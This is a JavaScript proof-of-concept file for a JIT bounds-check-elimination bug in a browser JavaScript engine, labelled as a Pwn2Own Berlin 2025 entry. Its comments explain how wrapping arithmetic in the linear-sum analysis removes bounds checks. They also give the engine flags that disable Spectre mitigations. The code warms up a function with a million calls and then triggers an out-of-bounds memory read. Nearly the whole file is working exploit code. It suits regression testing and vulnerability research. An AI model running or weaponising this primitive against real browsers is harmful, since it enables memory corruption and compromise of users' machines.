// CVE-2025-4919: JIT Bounds Check Elimination via ExtractLinearSum wrapping
// Pwn2Own Berlin 2025 - Manfred Paul
//
// Run with --fuzzing-safe --ion-offthread-compile=off --spectre-mitigations=off
//
// The bug: ExtractLinearSum uses wrapping uint32 addition in MathSpace::Modulo,
// producing incorrect linear sums. BCE then eliminates bounds checks based on
// the wrong sums. With Uint8Array(2^32), all uint32 indices appear valid so
// the JIT skips bounds checks. The corrupted linear sum causes the access to
// use index -201 (signed) which, in the release binary's codegen, results in
// an OOB memory access and SEGV.
//
// Note: ASAN binary maps 4GB+ shadow, preventing crash. Use release binary.
let arr = new Uint8Array(2**32);
let out = {x: 42n};
function oobRead(arr, out, idx) {
  let idx1 = (idx+100)|0;
  let idx2 = (idx+(2**31-1))|0;
  let r1 = arr[idx1];
  let r2 = arr[idx2];
  out.x = BigInt(idx2);
  return r2;
}
for (let i = 0; i < 1000000; i++) oobRead(arr, out, -50);
print(oobRead(arr, out, 2**31-200));
